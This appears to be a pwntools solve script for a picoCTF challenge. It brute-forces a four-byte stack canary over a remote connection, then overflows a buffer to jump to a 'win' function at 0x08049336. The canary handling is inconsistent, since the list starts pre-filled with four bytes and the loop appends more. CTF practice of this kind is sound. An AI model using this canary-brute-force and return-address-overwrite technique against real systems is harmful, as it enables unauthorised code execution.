#!/usr/bin/env python3
from pwn import *
import struct

f = './vuln'
success_text = "Ok... Now Where's the Flag?\n"

win_func = b'\x36\x93\x04\x08' # 0x08049336

jnk = b'\x41' * 64
canary = [66, 105, 82, 100]
filler = b'\x42' * 16


for canary_byte in range (4):
    cb = 0x00
    for i in range(255):
        print(f'Checking {hex(i)} in position {canary_byte}')
        
        payload = b'\x41' * 64
        for b in canary:
            payload += struct.pack("B", b)
        payload += struct.pack("B", cb)
        
        payload_len = len(payload)

        p = remote('saturn.picoctf.net', 59971) #process(f)
        p.recvuntil('> ')
        p.sendline(bytes(str(payload_len), 'ascii'))
        p.recvuntil('> ')
        p.sendline(payload)

        r = ''
        try:
            r = p.recvuntil(success_text)
            r = r.decode('utf-8')
        except EOFError:
            print('Process died')
        finally:
            p.close()
        
        if success_text in r:
            canary.append(cb)
            cb = 0x00
            print(f'[+] Byte {i} is valid in position {canary_byte}')
            break
        else:
            cb += 1
print(canary)


payload = b'\x41' * 64
for b in canary:
    payload += struct.pack("B", b)
payload += b'\x42' * (84 - len(payload))
payload += win_func
    
payload_len = len(payload)
print(payload)

p = remote('saturn.picoctf.net', 59971) #process(f)
print(p.recvuntil('> '))
p.sendline(bytes(str(payload_len), 'ascii'))
print(p.recvuntil('> '))
p.sendline(payload)
p.interactive()

p.close()
